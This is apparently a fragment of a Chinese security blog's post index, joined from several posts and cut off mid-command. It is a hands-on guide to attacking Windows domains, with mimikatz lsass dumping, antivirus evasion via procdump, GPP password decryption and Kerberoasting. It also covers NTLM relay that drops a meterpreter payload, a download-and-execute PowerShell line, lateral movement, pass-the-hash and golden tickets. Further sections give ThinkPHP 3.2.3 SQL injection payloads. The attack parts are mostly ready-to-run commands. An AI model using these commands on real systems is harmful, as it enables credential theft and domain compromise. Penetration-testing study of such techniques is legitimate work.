**高权限读取本地密码**\n\n当域管理员在域成员机器上登录进行工作的时候，会将明文密码保存在本地进行的lsass.exe，可以通过mimikatz来读取到本地的明文密码。\n\n```\nprivilege::debug  # 提权\nsekurlsa::logonpasswords\n```\n\n如果主机存在杀软的时候，上传mimikatz很多时候都会被杀掉，可以通过[procdump](https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump)+mimikatz的方式进行绕过。先导出lsass.exe\n\n```\nprocdump64.exe -accepteula -ma lsass.exe lsass.dmp\n```\n\n保存到本地，通过mimikatz读lsass.dmp的明文\n\n```\nmimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords full\"  > 1.txt\n```\n\n如果目标机器是windows server 2012，通过添加注册表，在通过锁屏，让管理员重新登录及可以读取明文。\n\n添加注册表，设置UseLogonCredential设置为1\n\n```\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n```\n\n利用powershell脚本进行锁屏\n\n```\nFunction Lock-WorkStation \n{\n$signature = @\"\n[DllImport(\"user32.dll\", SetLastError = true)]\npublic static extern bool LockWorkStation();\n\"@\n$LockWorkStation = Add-Type -memberDefinition $signature -name \"Win32LockWorkStation\" -namespace Win32Functions -passthru\n$LockWorkStation::LockWorkStation() | Out-Null\n}\nLock-WorkStation\n```\n\n管理员重新登录后就可以抓取到明文密码了。\n\n#### **SYSVOL还原组策略**\n\n在域环境中，有个默认的共享路径\n\n```\n\\\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\\n```\n\nSYSVOL是活动目录存储文件服务副本的共享文件夹，里面包含有登录脚本，组策略数据等，域里的所有用户都能访问这个共享文件。在SYSVOL目录下，默认是没有groups.xml文件的，必须创建组策略脚本登录才有这个文件。在groups.xml文件中，密码是通过AES-256加密的，但是微软发布了AES的[私钥](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN)。\n\n可以利用powershell解密密文:\n\n```powershell\nfunction Get-DecryptedCpassword {\n    [CmdletBinding()]\n    Param (\n        [string] $Cpassword\n    )\n \n    try {\n        #Append appropriate padding based on string length  \n        $Mod = ($Cpassword.length % 4)\n \n        switch ($Mod) {\n        '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}\n        '2' {$Cpassword += ('=' * (4 - $Mod))}\n        '3' {$Cpassword += ('=' * (4 - $Mod))}\n        }\n \n        $Base64Decoded = [Convert]::FromBase64String($Cpassword)\n \n        #Create a new AES .NET Crypto Object\n        $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider\n        [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,\n                             0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)\n \n        #Set IV to all nulls to prevent dynamic generation of IV value\n        $AesIV = New-Object Byte[]($AesObject.IV.Length) \n        $AesObject.IV = $AesIV\n        $AesObject.Key = $AesKey\n        $DecryptorObject = $AesObject.CreateDecryptor() \n        [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)\n \n        return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)\n    }\n \n    catch {Write-Error $Error[0]}\n}\nGet-DecryptedCpassword \"I0vK3Yj0SeoHQDxF5skcjt3BOkMZmX6IiqRVKCTo4Z4\"\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/1.png)\n\n针对SYSOVL的防御：\n\n```\n1.打补丁KB2962486\n2.删除SYSVOL目录下的groups.xml\n3.设置共享文件SYSVOL的权限\n```\n\n#### **Kerberoasting**\n\nSPN为服务主体名称，是服务实列(MSSQL,HTTP等)的唯一标识，如果在林中安装服务的多个实列，每个实列都有自己的SPN，如果kerberos服务票证的加密类型为RC4_HMAC_MD5，就可以导出TGS对其进行离线破解，获取到域用户的密码了。\n\n使用setspn查询spn(windows7和server2008默认自带)\n\n查询域内所有的SPN和查询test域的SPN\n\n```\nsetspn.exe -q */*\nsetspn.exe -T test.com -q */*\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/2.png)\n\n以CN开头的为代表一个账号，机器账号为Computers，域用户账号为Users\n\n查询域内注册的spn（kerberoast）\n\n```\ncscript GetUserSPNs.vbs\n```\n\nPowerView\n\nhttps://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1\n\n```\nGet-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon\n```\n\n给MSSQL服务注册SPN\n\n```\nsetspn.exe -A MSSQLSvc/WIN-M34UCFJIPNQ.test.com test.com\\fanxing\n```\n\n将kerberos的加密方式换成RC4_HMAC_MD5\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/3.png)\n\n请求指定的TGS，完成之后klist就能查看相应的票据\n\n```\n$SPNName = 'MSSQLSvc/WIN-M34UCFJIPNQ.test.com'\nAdd-Type -AssemblyNAme System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/4.png)\n\nmimikatz导出票据\n\n```\nkerberos::list /export\n```\n\n使用[tgsrepcrack.py](https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py)破解\n\n```\npython tgsrepcrack.py wordlist.txt mssql.kirbi\n```\n\n**kerberoasting后门利用**\n\n在获取到spn的修改权限后，可以给指定的域用户注册spn，可以获取到任意域用户的TGS进行离线破解\n\n```\nsetspn.exe -U -A VNC/WIN-M34UCFJIPNQ.test.com Administrator\n```\n\n#### **重放攻击**\n\n在NTML认证的过程中，数据包传递的是NTML-Hash加密的16位的challenge随机数得到的Net-NTML\n\n Hash，如果存在中间人的情况，就可以通过hash进行重放攻击，下面简述下存在中间人，NTML协议过程：\n\n![](https://p1.ssl.qhimg.com/t01f22f78b71df16680.png)\n\n```\n1.当客户端对服务端发起请求，客户端并不知道中间人存在，所以把请求发送给了中间人。中间人拿着这个请求发送给服务端，服务端以为是客户端发来的请求。\n2.进过验证后，会生成一个随机数(challenge)返回给攻击者，服务端保存的ntmlhash进行DES加密challenge(chal\nlenge1)，攻击者拿着这个challenge明文发送给客户端。\n3.客户端对这个challenge用自己的密码进行DES加密(response)，发送给中间人，中间人在将这个请求发送给服务端。\n4.服务端拿到这个response跟之前加密的challenge1进行对比，一样的话就验证成功。\n```\n\n在进行ntml中间人攻击的时候，要避免最小的网络流量，所以使用的比较多的也是LLMNR/NetNS欺骗。\n\n在两台windows进行进行资源请求的时候，对机器的解析顺序为：\n\n```\n1.HOSTS文件(c:/windows/system32/driver/etc/hosts)\n2.本地的DNS缓存(ipconfig /displaydns)\n3.dns服务器\n4.LLMNR\n5.NetBios-NS\n```\n\n##### SMB中继\n\n对于smb中继的利用条件：\n\n```\n1.不能开启smb签名，而在域内，域控上面是开启了签名的，域成员机器是没有开启的。\n2.打了ms08-068补丁的xp/2003系统也无法利用\n```\n\n首先利用nmap探测是否开启了签名\n\n```\nnmap -sT -p 445 --open --script smb-security-mode,smb-os-discovery 192.168.50.241\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/5.png)\n\n##### Responder+ntmlrelayx\n\n获取ntmlv2 hash，在攻击机执行\n\n```\npython Responder.py -I eth0 -v      #假设ip为192.168.50.64\n```\n\n在任意机器上执行\n\n```\ndir \\\\192.168.50.64\\c$\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/6.png)\n\n当使用ntmlrelayx进行重放攻击的时候，需要在Responder.conf设置SMB和HTTP服务为Off\n\n```\npython Responder.py -I eth0 -v    # 启动Responder，假设ip为192.168.50.64\npython ntlmrelayx.py -t 192.168.50.241   # -t为受害者，进行中继攻击\nnet use192.168.50.64\\c$ \"fx@123.com\" /user:\"administrator\"   # 攻击机执行\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/7.png)\n\n##### smbrelayx\n\n使用smbrelayx和ntmlrelayx都是利用的[impacket](https://github.com/CoreSecurity/impacket.git)，环境配置\n\n```\npip install pycrypto    # 安装加密库\napt-get --reinstall install python-pyasn1 python-pyasn1-modules\ncd impacket/\npython setup.py install\n```\n\n在攻击机进行重放攻击\n\n```\n# -h为指定受害者，-e在进行重放攻击后，在受害者机器执行exe\npython smbrelayx.py -h 192.168.50.241 -e /root/shell.exe \n```\n\n在内网其他目标机器执行\n\n```\nnet use192.168.50.64\\c$ \"fx@123.com\" /user:\"administrator\"\n```\n\n在msf上成功获取到meterpreter\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/8.png)\n\n##### Windows平台的重放攻击\n\n在windows下，可以利用powershell编写的[Inveigh](https://github.com/Kevin-Robertson/Inveigh)工具\n\n```\npowershell \"IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1');Invoke-Inveigh -consoleoutput Y FileOutput Y\"\n```\n\n在其他主机上执行\n\n```\ndir \\\\192.168.50.242\\c$   或者在开启HTTP，利用<img>来加载图片\n<img src=\"\\\\192.168.50.242\\1.png\">    在通过HTTP协议访问就行了\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/域图片/9.png)\n\n注意：在获取权限的那台机器，需要关闭windows防火墙，不是一直获取到challenge。","tags":["内网渗透"]},{"title":"ThinkPHP3.2.3 漏洞分析","url":"/2020/02/24/ThinkPHP3.2.3 漏洞分析/","content":"\n#### **where注入**\n\n在控制器中，写个demo，利用字符串方式作为where传参时存在注入\n\n```php\npublic function  getuser(){\n    $user = M('User')->where('id='.I('id'))->find();\n    dump($user);\n}\n```\n\n在变量user地方进行断点，PHPSTROM F7进入，I方法获取传入的参数\n\n```php\nswitch(strtolower($method)) {\n        case 'get'     :   \n        \t$input =& $_GET;\n        \tbreak;\n        case 'post'    :   \n        \t$input =& $_POST;\n        \tbreak;\n        case 'put'     :   \n        \tif(is_null($_PUT)){\n            \tparse_str(file_get_contents('php://input'), $_PUT);\n        \t}\n        \t$input \t=\t$_PUT;        \n        \tbreak;\n        case 'param'   :\n            switch($_SERVER['REQUEST_METHOD']) {\n                case 'POST':\n                    $input  =  $_POST;\n                    break;\n                case 'PUT':\n                \tif(is_null($_PUT)){\n                    \tparse_str(file_get_contents('php://input'), $_PUT);\n                \t}\n                \t$input \t=\t$_PUT;\n                    break;\n                default:\n                    $input  =  $_GET;\n            }\n            break;\n ......\n```\n\n重点看过滤函数\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/1.jpg)\n\n先利用htmlspecialchars函数过滤参数，在402行利用think_filter函数过滤常规sql函数\n\n```php\nfunction think_filter(&$value){\n\t// TODO 其他安全过滤\n\n\t// 过滤查询特殊字符\n    if(preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i',$value)){\n        $value .= ' ';\n    }\n}\n```\n\n在where方法中，将$where的值放入到options[\"where\"]数组中\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/2.png)\n\n继续跟进查看find方法，第748行\n\n```php\n$options     =   $this->_parseOptions($options);\n```\n\n在数组$options中增加'table'=>'tp_user'，'model'=>'User'，随后F7跟进select方法\n\n```php\npublic function select($options=array()) {\n        $this->model  =   $options['model'];\n        $this->parseBind(!empty($options['bind'])?$options['bind']:array());\n        $sql    = $this->buildSelectSql($options);\n        $result   = $this->query($sql,!empty($options['fetch_sql']) ? true : false);\n        return $result;\n}\n```\n\n跟进buildSelectSql方法，继续在跟进parseSql方法，这里可以看到生成完整的sql语句\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/3.png)\n\n这里主要查看parseWhere方法\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/4.png)\n\n跟进parseThinkWhere方法\n\n```php\nprotected function parseThinkWhere($key,$val) {\n        $whereStr   = '';\n        switch($key) {\n            case '_string':\n                // 字符串模式查询条件\n                $whereStr = $val;\n                break;\n            case '_complex':\n                // 复合查询条件\n                $whereStr = substr($this->parseWhere($val),6);\n                break;\n```\n\n$key为_string，所以$whereStr为传入的参数的值，最后parserWhere方法返回(id=1p)，所以最终payload为\n\n```\n1) and 1=updatexml(1,concat(0x7e,(user()),0x7e),1)--+\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/5.png)\n\n#### **exp注入**\n\n漏洞demo，这里使用全局数组进行传参(不要用I方法)，漏洞才能生效\n\n```php\npublic function  getuser(){\n        $User = D('User');\n        $map = array('id' => $_GET['id']);\n        $user = $User->where($map)->find();\n        dump($user);\n}\n```\n\n直接在$user进行断点，F7跟进，跳过where方法，跟进find->select->buildSelectSql->parseSql->parseWhere\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/1.png)\n\n跟进parseWhereItem方法，此时参数$val为一个数组，{'exp','sql注入exp'}\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/2.png)\n\n此时当$exp满足exp时，将参数和值就行拼接，所以最终paylaod为\n\n```\nid[0]=exp&id[1]==1 and 1=(updatexml(1,concat(0x7e,(user()),0x7e),1))--+\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/3.png)\n\n上面至于为什么不能用I方法，原因是在过滤函数think_filter中能匹配到exp字符，所以在exp字符后面加了一个空格，导致在parseWhereItem方法中无法等于exp。\n\n```php\nif(preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i',$value))\n```\n\n#### **bind注入**\n\n漏洞demo\n\n```php\npublic function  getuser(){\n        $data['id'] = I('id');\n        $uname['username'] = I('username');\n        $user = M('User')->where($data)->save($uname);\n        dump($user);\n}\n```\n\nF8跟进save方法\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/4.png)\n\n生成sql语句在update方法中\n\n```php\npublic function update($data,$options) {\n        $this->model  =   $options['model'];\n        $this->parseBind(!empty($options['bind'])?$options['bind']:array());\n        $table  =   $this->parseTable($options['table']);\n        $sql   = 'UPDATE ' . $table . $this->parseSet($data);\n        if(strpos($table,',')){// 多表更新支持JOIN操作\n            $sql .= $this->parseJoin(!empty($options['join'])?$options['join']:'');\n        }\n        $sql .= $this->parseWhere(!empty($options['where'])?$options['where']:'');\n        if(!strpos($table,',')){\n            //  单表更新支持order和lmit\n            $sql   .=  $this->parseOrder(!empty($options['order'])?$options['order']:'')\n                .$this->parseLimit(!empty($options['limit'])?$options['limit']:'');\n        }\n        $sql .=   $this->parseComment(!empty($options['comment'])?$options['comment']:'');\n        return $this->execute($sql,!empty($options['fetch_sql']) ? true : false);\n    }\n```\n\n在parseSet方法中，可以将传入的参数替换成:0\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/5.png)\n\n在bindParam方法中，$this->bind属性返回array(':0'=>参数值)\n\n```php\nprotected function bindParam($name,$value){\n        $this->bind[':'.$name]  =   $value;\n}\n```\n\n继续跟进parseWhere->parseWhereItem方法，当exp为bind时，就会在参数值前面加个冒号(:)\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/6.png)\n\n由于在sql语句中有冒号，继续跟进excute方法，这里将:0替换成了第二个参数的值\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/7.png)\n\n所以最终的payload为\n\n```\nid[0]=bind&id[1]=0 and 1=(updatexml(1,concat(0x7e,(user()),0x7e),1))&username=fanxing\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/8.png)\n\n#### **find/select/delete注入**\n\n先分析find注入，在控制器中写个漏洞demo\n\n```php\npublic function getuser(){\n    $user = M('User')->find(I('id'));\n    dump($user);\n}\n```\n\n当传入id[where]=1p时候，在user进行断点，F7跟进find->_parseOptions方法\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/9.png)\n\n$options['where']为字符串，导致不能执行_parseType方法转化数据，进行跟进select->buildSelectSql->parseSql->parseWhere方法，传入的$where为字符串，直接执行了if语句\n\n```php\nprotected function parseWhere($where) {\n        $whereStr = '';\n        if(is_string($where)) {\n            // 直接使用字符串条件\n            $whereStr = $where;\n            ......\n        }\n        return empty($whereStr)?'':' WHERE '.$whereStr;\n```\n\n当传入id=1p，就不能进行注入了，具体原因在find->\\_parseOptions->\\_parseType方法，将传入的参数进行了强转化为整形\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/10.png)\n\n所以，payload为\n\n```\n?id[where]=1 and 1=updatexml(1,concat(0x7e,(user()),0x7e),1)\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/11.png)\n\nselect和delete原理同find方法一样，只是delete方法多增加了一个判断是否为空\n\n```php\nif(empty($options['where'])){\n            // 如果条件为空 不进行删除操作 除非设置 1=1\n            return false;\n        }        \n        if(is_array($options['where']) && isset($options['where'][$pk])){\n            $pkValue            =  $options['where'][$pk];\n        }\n\n        if(false === $this->_before_delete($options)) {\n            return false;\n        }   \n```\n\n#### **order by注入**\n\n先在控制器中写个漏洞demo\n\n```php\npublic function user(){\n    $data['username'] = array('eq','admin');\n    $user = M('User')->where($data)->order(I('order'))->find();\n    dump($user);\n}\n```\n\n在user变量处断点，F7跟进，find->select->buildSelectSql->parseSql方法\n\n```php\n$this->parseOrder(!empty($options['order'])?$options['order']:''),\n```\n\n当$options['order']参数参在时，跟进parseOrder方法\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/12.png)\n\n当不为数组时，直接返回order by + 注入pyload，所以注入payload为\n\n```\norder=id and(updatexml(1,concat(0x7e,(select user())),0))\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/13.png)\n\n#### **缓存漏洞**\n\n在ThinkPHP3.2中，缓存函数有F方法和S方法，两个方法有什么区别呢，官方介绍如下\n\n```\nF方法：相当于PHP自带的file_put_content和file_get_content函数，没有太多存在时间的概念，是文件存储数据的方式。常用于文件配置。\nS方法：文件缓存，有生命时长，时间到期后缓存内容会得到更新。常用于单页面data缓存。\n```\n\n这里F方法就不介绍了，直接看S方法\n\n```php\npublic function test(){\n    S('name',I('test'));\n}\n```\n\n跟进查看S方法\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/14.png)\n\nset方法写入缓存\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/15.png)\n\n跟进filename方法，此方法获取写入文件的路径，保存在../Application/Runtime/Temp目录下\n\n```php\nprivate function filename($name) {\n        $name\t=\tmd5(C('DATA_CACHE_KEY').$name);\n        if(C('DATA_CACHE_SUBDIR')) {\n            // 使用子目录\n            $dir   ='';\n            for($i=0;$i<C('DATA_PATH_LEVEL');$i++) {\n                $dir\t.=\t$name{$i}.'/';\n            }\n            if(!is_dir($this->options['temp'].$dir)) {\n                mkdir($this->options['temp'].$dir,0755,true);\n            }\n            $filename\t=\t$dir.$this->options['prefix'].$name.'.php';\n        }else{\n            $filename\t=\t$this->options['prefix'].$name.'.php';\n        }\n        return $this->options['temp'].$filename;\n    }\n```\n\n并将S传入的name进行md5值作为文件名，最终通过file_put_contents函数写入文件。\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/16.png)\n\n","tags":["代码审计"]},{"title":"内网域渗透知识总结","url":"/2019/12/31/内网域渗透知识总结/","content":"\n#### **NTML协议**\n\n在工作组中，密码hash保存在本地的SAM文件中(%SystemRoot%\\system32\\config\\sam)，在域里保存在ntds.dit文件中，hash的格式为：`用户名称:SID:LM-Hash值:NT-Hash值`\n\n```\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:32057716c8bd0647d9197a9db0b041eb:::\n```\n\n500冒号后面的是LM hash，32057716c8bd0647d9197a9db0b041eb是ntml hash\n\n##### **LM Hash**\n\nLM Hash的全称是LAN Manager Hash，如果明文是`dbnames`，先要全部转换成大写，然后将大写字符串转换成16进制，如果明文大写转换的二进制不足14个字节，需要用0在后面添加到14个字节\n\n```\n44424e414d455300000000000000    dbnames的16进制为44424e414d4553\n```\n\n由于44424e414d4553转换二进制为8字节，所以这两个8字节数据要用魔术字符串`KGS!@#$%`DES加密\n\n```\n4B47532140232425     为'KGS!@#$%'的16进制\n```\n\n将得到的2个8字节作为key对KGS!@#$%进行des加密，可以利用安全客的一篇文章进行[des加密](https://www.anquanke.com/post/id/193149#h3-2)\n\n```\n44424e414d4553作为key为'KGS!@#$%'进行des加密：c8b9d6dc8e553d63\n00000000000000作为key为'KGS!@#$%'进行des加密：aad3b435b51404ee\n```\n\n##### **NTML Hash**\n\n从Windows Vista开始，密码默认情况是只有存储NTML Hash，LM Hash不会存在，在NTML Hash中，先将字符串进行16进制转换，然后在转换成unicode字符串，最后使用MD4加密算法对Unicode进行加密，所以LM Hash跟NTML相比，LM明文大小写不敏感，可以判断明文是否小于8位，不使用'KGS!@#$%'作为key进行des加密，而NTML采用单向加密方式(MD4)\n\n##### **NTML认证协议**\n\nNTML协议认证分为三部分：协商、质询、身份验证验证\n\n```\n\t\t\t\t\t\t\t1.协商\nClient <---------------------------------------------------->server\n\t\t\t\t\t\t\t2.质询(challenge)\nClient <---------------------------------------------------->server\n\t\t\t\t\t\t\t3.身份验证\nClient <---------------------------------------------------->server\n```\n\nNTML协议认证过程：\n\n1.用户输入账号密码，客户端中包含明文用用户名向服务端发起请求\n\n2.服务端接收到客户端的请求，会生成一个challenge 16位随机数，使用存储的NTML Hash加密challenge，生成challenge1，然后将challenge的16位明文随机数发送给客户端\n\n3.客户端接收到challenge后，使用用户登录的密码hash加密challenge生成response(challenge2)，将这个response发送给客户端\n\n4.服务端接收到response，对challenge1和challenge2进行比较，相同的话就验证成功\n\n##### **NTLM v1与NTLM v2**\n\nchallenge：NTML v1是8的随机数；NTML v2是16位的随机数\n\nNet-NTML Hash：\n\n1.NTML v1采用的是DES加密，在16字节后面填充5个0，组成21字节，然后分成3组7个字节的，并在每7个字节后面填充1个0，成为3个8字节的DES密钥，加密上诉步骤2(server)发来的challenge，组成24字节的密文。\n\n2.NTML v2采用的HMAC-MD5加密\n\n#### **Kerberos协议**\n\n在域环境中，主要采用的是kerberos协议，主要有下面几个角色\n\n1.AS：为客户端生成TGT服务\n\n2.TGS：为客户端生成某个服务的ticket\n\n3.KDC：安全认证中票据生成管理服务，里面包含AS和TGS\n\n4.AD：存储整个域内的所有计算机，用户等信息\n\n##### **Kerberos协议认证过程**\n\n![1](https://bbs.ichunqiu.com/data/attachment/forum/201912/31/102901ze0er0rhuutesc5y.png.thumb.jpg)\n\n1.客户端向KDC(AS)发起一个认证请求(KRB_AS_REQ)，在请求的过程中，是通过用户的密码hash加密的时间戳，然后发送给AS服务器，AS服务器接收到后，采用服务器那边的密码hash进行解密这个时间戳，解密成功后，并且时间戳在一定时间范围，说明认证成功。\n 2.AS对比用户是否在本地数据库中，使用客户端的hash进行解密，正确就返回krbtgt的密码hash加密的TGT票据(到期时间一般为8小时)，用户是无法解密这个TGT票据的，但是有了krbtgt的hash，就可以伪造'黄金票据'。还要返回一个由客户端用户ntml hash加密的Session Key(sessionkey1)，Session  Key是KDC接收请求后的随机生成的字符(KRB_AS_REP)。\n 3.客户端用自己的密码hash解密Session Key，TGT是KDC加密的，Client无法解密，Client拿着解密出来的SessionKey去加密时间戳和TGT发送给TGS换取访问Server的票据(KRB_TGS_REQ)。\n 4.TGS收到Client的请求后，会验证是否存在客户端要访问的这个服务，存在的话KDC使用krbtgt的密码hash对TGT进行解密，然后会查看TGT中的时间戳，看是否TGT失效，如果解密成功的TGT没有失效，向客户端发送通过sessionkey1加密的Session_key和ticket票据，在TGSREP中，用的是服务的hash加密ticket的，所有我们拥有这个服务的hash就可以制作一个ticket(即白银票据)(KRB_TGS_REP)。\n 5.客户端拿着自己sessionkey1解密的Session_Key(sessionkey2)，然后把sessionkey2加密的时间戳和ticket发送个Server去访问服务，认证通过就可以访问(KRB_AP_REQ)。\n 6.服务使用自己的hash去解密ticket票据，得到sessionkey2，在用sessionkey2去解密时间戳，解密成功，就用PAC去KDC问客户端是否有访问的权限，域控解密PAC，用于让客户端识别是否访问正确的服务端(KRB_AP_REP)。\n\n#### **内网横向移动的方法**\n\n##### **ipc连接**\n\n```\nnet use \\\\192.168.1.232\\C$ admin123456 /user:fanxing.com\\fanxing\n```\n\n复制文件到主机上\n\n```\ncopy 1.bat \\\\192.168.1.232\\c$\\tools\n```\n\n获取服务器的时间\n\n```\nnet time \\\\192.168.1.232\n```\n\n创建计划任务，20:05执行1.bat文件，cobaltstrike上线成功\n\n```\nat \\\\192.168.1.232 20:05 c:\\tools\\1.bat\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/黄银14/3.png)\n\n下面是ipc连接当中常见的错误号：\n\n```\n错误号5：拒绝访问--->使用的权限太低，需要提权\n错误号51：Windows无法找到网络路径，网络有问题\n错误号53：找不到网络路径，ip地址错误、目标未开机、目标lanmanserver服务未开启、目标有防火墙(端口过滤)\n错误号67：找不到网络名->你的lanmanworkstation服务未启动或者目标删除了ipc$\n错误号1219：提供的凭据与已存在的凭据集冲突->你已经和对方建立了一个ipc，请删除在连接\n错误号1326：未知的用户名或错误密码\n错误号1792：试图登录，但是网络登录服务没启动->目标BetLogon服务未启动\n错误号2242：此用户的密码已经过期->目标有账号策略，强制定期要求更改密码\n```\n\n##### **schtasks创建计划任务**\n\n设置每天晚上8:40执行1.bat文件\n\n```\nschtasks /create /s 192.168.1.232 /u fanxing.com\\fanxing /p admin@163.com /ru \"SYSTEM\" /tn fanxing /sc DAILY /st 20:40  /tr c:\\tools\\1.bat /F\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/黄银14/4.png)\n\n##### **WMI**\n\nwmi服务需要开启135端口，这个是默认开启的。\n\n```\nwmic /node:192.168.1.232 /user:fanxing.com\\fanxing /password:admin@163.com process call create \"cmd /c 1.exe\"\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/黄银14/5.png)\n\n使用wmic没有任何回显，可以wmicexec.vbs解决无回显的问题，或者获取一个半交互式shell。\n\n```\ncscript wmiexec.vbs /cmd 192.168.1.232 fanxing.com\\fanxing admin@163.com whoami\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/黄银14/6.png)\n\n##### **pstools**\n\npstools中有13个小工具，这里主要利用psexec进行远程执行命令，唯一的缺点就是会开启一个服务，容易被管理员发现。\n\n在ipc建立连接的时候，可以直接使用psexec:\n\n```\npsexec.exe \\\\192.168.1.232 -h cmd /c \"whoami\"\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/黄银14/7.png)\n\n当ipc没有连接时\n\n```\nPsexec.exe \\\\192.168.1.232 -u fanxing.com\\fanxing -p admin@163.com -h cmd /c \"whoami\"\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/黄银14/8.png)\n\n使用metasploit执行\n\n```\nuse auxiliary/admin/smb/p**ec_command\nset rhosts 192.168.1.232\nset smbuser fanxing\nset smbpass admin@163.com\nset smbdomain fanxing.com\nset command whoami\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/黄银14/9.png)\n\n##### **hash传递(PTH)**\n\nhash传递是通过密码的hash访问主机或者服务，不需要明文登录。hash的原理，出现在上面讲的NTML认证过程的challenge。利用metasploit：\n\n```\nuse exploit/windows/smb/psexec\nset rhosts 192.168.50.233\nset SMBPass 32057716c8bd0647d9197a9db0b041eb\nset SMBUser administrator\nset SMBDomain fanxing.com\n```\n\n#### **黄金票据**\n\n黄金票据是AS颁发给Client的TGT票据(TGT的有效时间为20分钟)，是通过域kerberos账户(KRBTGT)加密的。实现原理就是跳过了AS的认证过程，直接向KDC的TGS服务证明通过了AS服务。一般黄金票据都是域控的权限掉了的时候，修改了域控的密码，而krbtgt的密码没有被修改，就可以重新获取到域控权限。\n\n满足黄金票据的条件有：\n\n1.域的名称\n\n2.域的SID值\n\n3.域中KRBTGT的密码hash\n\n4.伪造的用户名\n\n在金票的利用过程中，可以使用mimikatz，cobaltstrike，metasploit来伪造。\n\n##### **Mimikatz**\n\n导出krbtgt的NTML Hash\n\n```\nprivilege::debug      #提权\nlsadump::dcsync /domain:fanxing.com /user:krbtgt\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/黄银14/10.png)\n\n获取域的SID值，不要后面的-500\n\n```\nwhoami /all\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/黄银14/11.png)\n\n伪造金票\n\n```\nkerberos::golden /domain:fanxing.com /sid:S-1-5-21-3408186607-3793295459-3581146574 /aes256:3df036f90aaf3a63a5cce96fc753f08beb5a2e61946e17cc7d5e6ce04b651b89 /user:fanxing /ticket:gold.kirbi\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/黄银14/12.png)\n\n导入Golden Ticket\n\n```\nkerberos::ptt c:\\users\\test\\gold.kirbi\n```\n\n![](https://raw.githubusercontent.com/jfanx1ng/blog-img/master/黄银14/13.png)\n\n可以使用dir访问域控目录，要输入主机名，使用ip还是访问不到\n\n```\ndir 